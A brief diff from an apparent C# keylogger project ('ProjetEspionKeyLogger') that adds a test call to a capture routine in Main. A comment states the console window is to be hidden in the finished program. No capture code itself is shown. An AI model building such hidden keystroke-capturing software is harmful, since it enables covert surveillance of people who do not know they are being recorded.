@@ -8,6 +8,9 @@ namespace ProjetEspionKeyLogger
     {
         static void Main(string[] args)
         {
+            //Test de la fonction
+            Enregistrement.Capture();
+
             //Ligne a supprimer la console ne devra surtout pas s'afficher une fois le progamme créé
             Console.WriteLine("Hello World!");
 
